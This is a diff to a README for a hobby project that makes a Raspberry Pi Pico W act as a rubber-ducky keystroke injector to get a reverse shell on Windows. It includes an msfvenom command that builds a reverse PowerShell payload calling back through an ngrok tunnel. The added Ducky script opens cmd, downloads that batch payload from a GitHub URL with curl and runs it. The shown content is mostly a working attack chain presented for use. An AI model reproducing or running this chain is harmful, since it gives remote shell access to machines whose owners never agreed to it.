@@ -8,7 +8,7 @@ For port forwarding
 ```ngrok tcp 8080```<br><br>
 ![ngrok](https://github.com/aayushdangol16/Reverse-shell-by-rubber-ducky/blob/main/ngrok.png)<br><br>
 ![ngrok1](https://github.com/aayushdangol16/Reverse-shell-by-rubber-ducky/blob/main/ngrok1.png)<br><br>
-Create windows reverse PowerShell payload<br>
+Generate windows reverse PowerShell payload<br>
 ```msfvenom -p cmd/windows/reverse_powershell lhost=0.tcp.in.ngrok.io lport=10448 > ayush.bat ```<br><br>
 ![msf](https://github.com/aayushdangol16/Reverse-shell-by-rubber-ducky/blob/main/msf.png)
 ## Rasberry pi pico w as rubber ducky
@@ -26,3 +26,23 @@ Create windows reverse PowerShell payload<br>
 ## Setting up an attacker server and a Ducky script
 Upload the Windows reverse PowerShell payload (ayush.bat) to your server; in my case, I have uploaded it to GitHub.<br><br>
 Create Ducky script
+```
+DELAY 3000
+GUI r
+DELAY 200
+STRING cmd
+ENTER
+DELAY 200
+STRING cd OneDrive 
+ENTER
+DELAY 200
+STRING cd Desktop
+ENTER
+DELAY 200
+STRING curl "https://raw.githubusercontent.com/aayushdangol16/payload/main/ayush.bat" > ayush.bat
+ENTER
+DELAY 300
+STRING ayush.bat 
+ENTER
+
+```
